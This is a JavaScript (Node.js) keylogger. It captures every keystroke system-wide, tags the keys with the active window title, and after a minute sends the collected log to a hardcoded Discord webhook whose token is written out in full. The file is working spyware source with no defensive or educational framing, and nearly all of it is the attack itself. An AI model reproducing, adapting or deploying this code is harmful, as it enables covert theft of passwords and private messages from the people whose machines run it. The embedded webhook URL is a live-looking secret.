
//import {GlobalKeyboardListener} from "node-global-key-listener";
 
var GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener
const axios = require('axios');
const qs = require('qs');
const cheerio = require('cheerio')
//require('\\node_modules\\node-global-key-listener\\bin\\WinKeyServer.exe')
require('node-global-key-listener')
const activeWindow = require('active-win');
 
var activeWinTitle = '';
var winT = '';
var activeWinProcessId = '';
var winP = '';
 
setInterval(async() => {
    var rs = await activeWindow()
    winT = (rs.title != undefined) ? rs.title.toLowerCase() : "No Title"
    winP = rs.owner.processId
}, 1000)

// Discord Webhook URL
const webhookUrl = 'https://discord.com/api/webhooks/1224971203576332339/3_E678uk49dUGMqkq8k0D9vT0P7n_HwBO049nf8WAylUvmcnxPFKFKgvGCLI6GLiYNUA';
 
// Function to send Discord webhook
async function submit_logs (message) {
    try {
        const response = await axios.post(webhookUrl, {
            content: message,
        });
        console.log('Webhook sent:', response.data);
    } catch (error) {
        console.error('Error sending webhook:', error);
    }
}
setInterval(async() => {
    var rs = await activeWindow()
    winT = (rs.title != undefined) ? rs.title.toLowerCase() : "No Title"
    winP = rs.owner.processId
}, 1000)
 
 
var alhpaNum = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
var holdKeys = ['LEFT SHIFT', 'LEFT CTRL', 'LEFT ALT', 'RIGHT SHIFT', 'RIGHT CTRL', 'RIGHT ALT']
var longKeys = {
    "SECTION": '`',
    "MINUS": '-',
    "EQUALS": '=',
    "SQUARE BRACKET OPEN": '[',
    "SQUARE BRACKET CLOSE": ']',
    "BACKSLASH": '\\',
    "SEMICOLON": ';',
    "QUOTE": '"',
    "COMMA": ',',
    "DOT": '.',
    "FORWARD SLASH": '/',
    "BACKSPACE": '<BACKSPACE>',
    "RETURN": '<ENTER>',
    "TAB": '<TAB>',
    "LEFT ARROW": '<LEFT>',
    "RIGHT ARROW": '<RIGHT>',
    "DOWN ARROW": '<DOWN>',
    "UP ARROW": '<UP>',
}
 
var rawLogs = ''
var currHold = '';
var prevHold = '';
const v = new GlobalKeyboardListener();
 
function myFunction() {
    KeyboardEvent.getModifierState('CapsLock')
  }
 
//Log every key that's pressed.
v.addListener(function (e, down) {
    //var cls = KeyboardEvent.getModifierState('CapsLock')
    //console.log("CLS", cls)
    // console.log(
    //     `${e.name} ${e.state == "DOWN" ? "DOWN" : "UP  "} [${e.rawKey._nameRaw}]`
    // );
    if (activeWinTitle != winT) {
        activeWinTitle = winT
        activeWinProcessId = winP
        console.log(`\n[Window: ${activeWinTitle}]\n`)
    }
    if (e.state == "DOWN" && alhpaNum.includes(e.name)) {
        process.stdout.write((currHold != '<L.SHIFT>' && currHold != '<R.SHIFT>') ? e.name.toLowerCase() : e.name);
        rawLogs += (currHold != '<L.SHIFT>' && currHold != '<R.SHIFT>') ? e.name.toLowerCase() : e.name
    } else if (e.state == "DOWN" && alhpaNum.includes(e.name)) {
        process.stdout.write(e.name);
        rawLogs += e.name
    } else if (e.state == "DOWN" && longKeys[e.name] != undefined) {
        process.stdout.write(longKeys[e.name]);
        rawLogs += longKeys[e.name]
    } else if ((e.state == "UP" || e.state == "DOWN") && holdKeys.includes(e.name)) {
        var kex = e.name.split(' ');
        var key = kex[1];
        var loc = kex[0].substring(0,1)
        currHold = `<${(e.state == "UP") ? '/': ''}${loc}.${key}>`
        if (currHold != prevHold) {
            process.stdout.write(currHold);
            prevHold = currHold
            rawLogs += currHold
        }
    }
});
 
//Capture Windows + Space on Windows and Command + Space on Mac
v.addListener(function (e, down) {
    if (
        e.state == "DOWN" &&
        e.name == "SPACE" &&
        (down["LEFT META"] || down["RIGHT META"])
    ) {
        //call your function
        return true;
    }
});
 
//Capture ALT + F
v.addListener(function (e, down) {
    if (e.state == "DOWN" && e.name == "F" && (down["LEFT ALT"] || down["RIGHT ALT"])) {
        //call your function
        return true;
    }
});
 
//Call one listener only once (demonstrating removeListener())
calledOnce = function (e) {
    //console.log("only called once");
    v.removeListener(calledOnce);
};
v.addListener(calledOnce);
 
/* 
 To add logging of errors please use. This is hopefully not needed in most cases, but may still be useful in production.
    new GlobalKeyboardListener({
        windows: {
            onError: (errorCode) => console.error("ERROR: " + errorCode),
            onInfo: (info) => console.info("INFO: " + info)
        },
        mac: {
            onError: (errorCode) => console.error("ERROR: " + errorCode),
        }
    })
*/
 
 
 
setTimeout(async () => {
   await  submit_logs(rawLogs);
}, 1000 * 60);